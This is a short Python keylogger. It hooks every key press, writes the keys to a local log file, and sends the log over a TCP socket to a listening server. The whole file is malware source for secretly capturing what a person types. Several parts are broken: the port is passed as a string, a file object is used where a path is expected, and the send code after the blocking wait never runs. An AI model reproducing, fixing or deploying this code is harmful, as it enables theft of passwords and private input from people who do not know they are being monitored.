import keyboard
import socket
import os

def keyPress(event):

    with open("KeyLog.txt", "a") as f:
        if event.name == "enter":
            f.write('\n----------\n (Return) \n----------\n')
        else:
            f.write('{}'.format(event.name))


def sendMessage(s, log):

    file = open(log, 'rb')
    #For getting file size, may not be used.
    file_size = os.path.getsize(file)

    s.send("recieved_log".encode())
    #More file size stuff
    s.send(str(file_size).encode())

    data = file.read()
    s.sendall(data)
    s.send(b"<END>")
    


def main():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("localhost",'9999'))


    log = open("KeyLog.txt", 'w')
    keyboard.on_press(keyPress)
    keyboard.wait()

    #Send log file every day?  Needs function for that
    sendMessage(s, log)

if __name__ == "__main__":
    main()